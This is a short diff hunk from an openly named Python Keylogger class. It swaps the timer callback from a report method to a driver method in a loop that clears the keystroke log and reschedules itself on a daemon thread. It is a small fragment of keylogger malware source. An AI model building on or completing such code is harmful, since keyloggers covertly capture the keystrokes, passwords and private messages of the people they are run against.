@@ -64,7 +64,7 @@ class Keylogger:
         # reset log!
         self.log = ''
         # call itself after a certain time
-        timer = Timer(interval=self.interval, function=self.report)
+        timer = Timer(interval=self.interval, function=self.driver)
         # setting the thread as daemon means it dies when main thread dies
         timer.daemon = True
         timer.start()
